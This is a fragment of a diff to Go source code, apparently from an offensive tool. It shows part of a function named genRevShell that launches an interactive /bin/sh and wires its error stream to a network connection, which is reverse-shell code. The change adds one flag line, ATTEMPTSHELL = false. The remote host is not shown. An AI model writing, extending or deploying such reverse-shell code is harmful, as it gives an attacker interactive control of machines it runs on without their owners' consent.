@@ -32,7 +32,7 @@ func genRevShell() {
 		fmt.Println(err)
 	} else {
 		defer revConn.Close()
-
+		ATTEMPTSHELL = false
 		shell := exec.Command("/bin/sh", "-i")
 
 		shell.Stderr = revConn
